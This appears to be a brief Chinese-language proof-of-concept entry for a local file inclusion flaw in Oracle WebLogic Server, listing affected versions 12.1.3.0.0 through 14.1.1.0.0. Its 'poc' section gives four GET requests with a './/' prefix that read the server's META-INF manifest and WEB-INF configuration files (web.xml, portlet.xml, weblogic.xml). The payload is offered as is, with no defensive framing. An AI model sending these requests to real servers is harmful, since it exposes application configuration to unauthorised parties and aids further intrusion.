# Oracle WebLogic Server 14.1.1.0.0 -  本地文件包含



## 受影响版本

```txt
12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0
```

## poc

```txt
GET .//META-INF/MANIFEST.MF
GET .//WEB-INF/web.xml
GET .//WEB-INF/portlet.xml
GET .//WEB-INF/weblogic.xml
```